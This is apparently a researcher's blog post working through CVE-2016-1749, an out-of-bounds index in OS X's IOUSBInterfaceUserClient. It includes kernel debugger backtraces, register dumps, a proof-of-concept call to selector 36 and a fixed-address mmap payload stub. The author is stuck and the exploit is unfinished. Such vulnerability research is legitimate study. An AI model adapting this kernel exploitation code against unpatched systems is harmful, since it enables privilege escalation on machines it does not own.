---
layout:    post
title:     CVE-2016-1749 Apple OS X IOUSBInterfaceUserClient Out-Of-Bounds Indexing Privilege Escalation
author:    wooy0ung
tags:      cve
category:  exploit
---


>[Analysis Environment]  
>physical machin: macOS 10.12.6 Sierra    192.168.1.63  
>virtual machine: OS X 10.11 EI Capitan   192.168.1.53  
>affected system: OS X before 10.11.4(proved on 10.11~10.11.3)  
<!-- more -->


reference to [Learning A Guide to Kernel Exploitation](http://www.wooy0ung.me/xnu/2018/05/06/guide2-kernel-exploitation/) to config environment

debug kernel core
![](/assets/img/xnu/2018-05-07-cve-2016-1749/0x001.png)

stack backtrace
```
(lldb) bt                                                                                                           │R10 FFFFFF7F8F70C04F | O.p..... |
* thread #1, stop reason = signal SIGSTOP                                                                           │R11 000000000000003D | =....... |
  * frame #0: 0xffffff7f8f6f3159 IOUSBFamily`AppleUSBPipe::Abort(this=0xffffff801a81a600, streamID=4042322160) at Ap│R12 0000000000000000 | ........ |
pleUSBPipe.cpp:1179 [opt]                                                                                           │R13 0000000000000000 | ........ |
    frame #1: 0xffffff7f8f6e6bf5 IOUSBFamily`IOUSBInterfaceUserClient::AbortStreamsPipe(this=<unavailable>, pipeRef=│R14 00000000F0F0F0F0 | ........ |
<unavailable>, streamID=4042322160) at IOUSBInterfaceUserClient.cpp:3656 [opt]                                      │R15 00000000F0F0F0F0 | ........ |
    frame #2: 0xffffff7f8f6e1757 IOUSBFamily`IOUSBInterfaceUserClient::_AbortStreamsPipe(target=<unavailable>, refer│CS  0000  DS  0000
ence=<unavailable>, arguments=<unavailable>) at IOUSBInterfaceUserClient.cpp:3636 [opt]                             │ES  n/a   FS  0000
    frame #3: 0xffffff800eebb4e7 kernel.development`::is_io_connect_method(connection=0xffffff801985b200, selector=3│GS  0000  SS  n/a
6, scalar_input=<unavailable>, scalar_inputCnt=<unavailable>, inband_input=<unavailable>, inband_inputCnt=0, ool_inp│
ut=<unavailable>, ool_input_size=<unavailable>, inband_output=<unavailable>, inband_outputCnt=<unavailable>, scalar_│
output=<unavailable>, scalar_outputCnt=<unavailable>, ool_output=<unavailable>, ool_output_size=<unavailable>) at IO│
UserClient.cpp:3593 [opt]                                                                                           │
    frame #4: 0xffffff800e963720 kernel.development`_Xio_connect_method(InHeadP=<unavailable>, OutHeadP=0xffffff8017│
86e5d0) at device_server.c:8255 [opt]
    frame #5: 0xffffff800e8929c3 kernel.development`ipc_kobject_server(request=0xffffff80179c7240) at ipc_kobject.c:│R15 00000000F0F0F0F0 | ........ |
339 [opt]                                                                                                           │CS  0000  DS  0000
    frame #6: 0xffffff800e86e703 kernel.development`ipc_kmsg_send(kmsg=<unavailable>, option=<unavailable>, send_tim│ES  n/a   FS  0000
eout=0) at ipc_kmsg.c:1440 [opt]                                                                                    │GS  0000  SS  n/a
    frame #7: 0xffffff800e885045 kernel.development`mach_msg_overwrite_trap(args=<unavailable>) at mach_msg.c:470 [o│
pt]                                                                                                                 │
    frame #8: 0xffffff800e989c90 kernel.development`mach_call_munger64(state=0xffffff80189915a0) at bsd_i386.c:560 [│
opt]                                                                                                                │
    frame #9: 0xffffff800e9bf186 kernel.development`hndl_mach_scall64 + 22                                          │
```

poc first call function No.36 _AbortStreamsPipe in IOUSBFamily ->
IOUSBInterfaceUserClient::AbortStreamsPipe -> AppleUSBPipe::Abort and crash eventually
```
    frame #3: 0xffffff800eebb4e7 kernel.development`::is_io_connect_method(connection=0xffffff801985b200, selector=36, scalar_input=<unavailable>, scalar_i│
nputCnt=<unavailable>, inband_input=<unavailable>, inband_inputCnt=0, ool_input=<unavailable>, ool_input_size=<unavailable>, inband_output=<unavailable>, i│SS
nband_outputCnt=<unavailable>, scalar_output=<unavailable>, scalar_outputCnt=<unavailable>, ool_output=<unavailable>, ool_output_size=<unavailable>) at IOU│
serClient.cpp:3593 [opt]
//
//...
  err = IOConnectCallMethod(
   conn,
   36,
   inputScalar,
   inputScalarCnt,
   inputStruct,
   inputStructCnt,
   outputScalar,
   &outputScalarCnt,
   outputStruct,
   &outputStructCnt); 
//...
```

but I am confused with rip point to "movq   (%rcx,%rax,8), %rdi"
```
General Purpose Registers:                                                                                             │GS  0000  SS  n/a
       rax = 0x00000000f0f0f0f0                                                                                        │
       rbx = 0xffffff801a81a600                                                                                        │
       rcx = 0x0000000000000000                                                                                        │
       rdx = 0xffffff8015558930                                                                                        │
       rdi = 0xffffff801a81a600                                                                                        │
       rsi = 0x00000000f0f0f0f0                                                                                        │
       rbp = 0xffffff806e133b20                                                                                        │
       rsp = 0xffffff806e133ae0
        r8 = 0x0000000000000000                                                                                        │ES  n/a   FS  0000
        r9 = 0x0000000000000000                                                                                        │GS  0000  SS  n/a
       r10 = 0xffffff7f8f70c04f  ""                                                                                    │
       r11 = 0x000000000000003d                                                                                        │
       r12 = 0x0000000000000000                                                                                        │
       r13 = 0x0000000000000000                                                                                        │
       r14 = 0x00000000f0f0f0f0                                                                                        │
       r15 = 0x00000000f0f0f0f0                                                                                        │
       rip = 0xffffff7f8f6f3159  IOUSBFamily`AppleUSBPipe::Abort(unsigned int) + 139 at AppleUSBPipe.cpp:1179          │
    rflags = 0x0000000000010286
        cs = 0x0000000000000008                                                                                        │
        fs = 0x0000000000000000                                                                                        │
        gs = 0x0000000000000000

rdi = rcx + rax * 8 = 0x787878780
```
![](/assets/img/xnu/2018-05-07-cve-2016-1749/0x002.png)

normally, address 0x0000000787878000 to 0x0000000787879000 may map and memset 'A'

but in this case, I even can't find this address
```
void map_payload(uint64_t target_rip) {
  uint64_t*** obj_ptr_ptr = (void*)0x0000000787878780;
  void* request           = (void*)0x0000000787878000;
  void* page = mmap(request, 0x1000, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANON|MAP_PRIVATE, -1, 0);
  if (request != page) {
    printf("MAP_FIXED didn't give us the right page\n");
    exit(EXIT_FAILURE);
  }
 
  memset((void*)page, 'A', 0x1000);
}
```

why? I promise mmap was called successfully, not end...